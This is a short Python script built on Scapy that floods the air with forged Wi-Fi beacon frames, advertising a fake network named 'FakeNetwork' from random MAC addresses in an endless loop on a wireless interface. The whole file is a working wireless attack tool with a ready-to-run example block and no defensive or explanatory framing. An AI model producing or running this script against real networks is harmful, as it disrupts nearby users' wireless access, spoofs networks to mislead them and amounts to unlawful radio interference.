from scapy.all import *

def beacon_flood(ssid, interface):
    """Flood the network with fake beacon frames."""
    dot11 = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=RandMAC(), addr3=RandMAC())
    beacon = Dot11Beacon(cap='ESS')
    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
    packet = dot11 / beacon / essid
    sendp(packet, iface=interface, inter=0.1, loop=1)  # Send packets continuously

# Example usage
if __name__ == "__main__":
    ssid = "FakeNetwork"  # SSID of the fake network
    interface = "wlan0"  # Network interface
    beacon_flood(ssid, interface)
